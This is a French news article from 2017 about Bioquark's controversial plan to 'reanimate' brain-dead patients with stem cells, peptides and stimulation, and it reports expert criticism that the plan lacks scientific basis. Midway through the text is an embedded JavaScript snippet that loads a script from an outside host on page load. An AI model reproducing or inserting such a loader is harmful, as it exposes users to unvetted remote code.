{"title": "Ils veulent reveiller les morts avec des cellules souches", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-07", "content": "L'entreprise Bioquark envisage de mener un essai clinique tres controverse d'ici la fin de l'annee. Le projet vise a restaurer une activite neuronale chez des personnes en mort cerebrale a l'aide de plusieurs techniques : injection de cellules souches, stimulation nerveuse et laser. Ce qu'il faut retenir Bioquark envisage un essai clinique en Amerique latine. Il s'agit de redonner vie a des personnes decedees grace a des cellules souches et des stimulations electriques. Un tel essai etait prevu en Inde mais a ete interdit par les autorites en 2016. Les  cellules souches  apparaissent de plus en plus comme une piste serieuse pour traiter de nombreuses  pathologies  nerveuses :  Alzheimer ,  Parkinson , lesions cerebrales... Alors pourquoi pas reparer le  cerveau  des morts pour ramener ces derniers a la  vie  ? Cette idee, digne d'un scenario de film de science-fiction (ou d'horreur), est le projet fou porte par une societe americaine basee a Philadelphie : Bioquark. Ce n'est pas la premiere fois que la societe veut participer a une experience de ce genre. En 2016, l'etude ReAnima avait ete lancee en Inde, a Bangalore, avec Himanshu Bansal, un chirurgien orthopedique de l'hopital Anupam. Son projet etait de combiner plusieurs techniques pour << reanimer >> 20 personnes en  mort cerebrale .  ReAnima consistait a injecter aux patients des  cellules souches  mesenchymateuses et des  peptides  qui aident a regenerer les cellules du cerveau ; ces peptides devaient etre fournis par l'entreprise Bioquark. En plus de ces injections, une  stimulation  laser transcranienne et une stimulation nerveuse etaient prevues. Ce projet est tombe a l'eau, stoppe net par les autorites indiennes en novembre dernier, comme le revelait alors la revue  Science .  Mais l'entreprise ne s'est pas avouee vaincue. Cette fois-ci, d'apres le  Business Insider , elle serait sur le point de trouver un nouveau lieu pour ses essais cliniques. Ira Pastor, PDG de Bioquark, a declare au site  Stat  que l'entreprise ferait l'annonce de cet essai en Amerique latine dans les prochains mois.  Le projet consiste a injecter des cellules souches pour former de nouveaux neurones qui vont se connecter et ramener le cerveau a la vie. (c) nobeastsofierce, Fotolia                               Des questions ethiques sur une experience sans fondement scientifique Si l'experience suit le meme  protocole  que celui prevu en Inde, elle pourrait inclure 20 personnes. L' essai clinique  consisterait la aussi a injecter des cellules souches provenant du  patient , issues de la graisse, du sang... Ensuite, un melange de peptides serait injecte dans la  moelle epiniere  pour favoriser la croissance des nouveaux  neurones . Ce melange, appele  BQ-A , a ete teste dans des modeles animaux de  melanomes  et de  traumatismes craniens . A cela s'ajouteraient une stimulation nerveuse et une  therapie  laser de 15 jours pour pousser les neurones a etablir des connexions nerveuses. Les chercheurs pourraient alors suivre les effets de ce traitement grace a des  electroencephalogrammes .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Un essai qui donnerait aux familles un faux et cruel espoir de retablissement. Mais un tel protocole souleve de nombreuses interrogations : comment mener un  essai clinique  sur des personnes officiellement decedees ? Si la personne retrouve une certaine activite cerebrale, dans quel etat sera-t-elle ? Donne-t-on de faux espoirs aux familles avec un traitement qui risque d'etre long ? Or, rien ne laisse penser qu'un tel protocole puisse fonctionner. L'entreprise n'a meme pas teste le traitement complet sur des modeles animaux ! Les traitements evoques, comme l'injection de cellules souches ou la stimulation transcranienne, ont pu etre testes dans d'autres situations, mais pas dans le cas de morts cerebrales. Dans un  article paru en 2016 , la neurologue Ariane Lewis et le specialiste de  bioethique  Arthur Caplan signalaient que l'experience n'avait aucun fondement scientifique et qu'elle donnait aux familles un  << faux et cruel espoir de retablissement >> . Le fantastique pouvoir des cellules souches                       La jeunesse eternelle semble etre une quete aussi ancienne que l'humanite. Il se pourrait que cette fontaine de jouvence tant convoitee se situe au coeur meme de notre organisme, au sein des cellules souches. Discovery Science nous emmene a la decouverte de ces etonnantes cellules en video.                                       ", "theme": "sante"}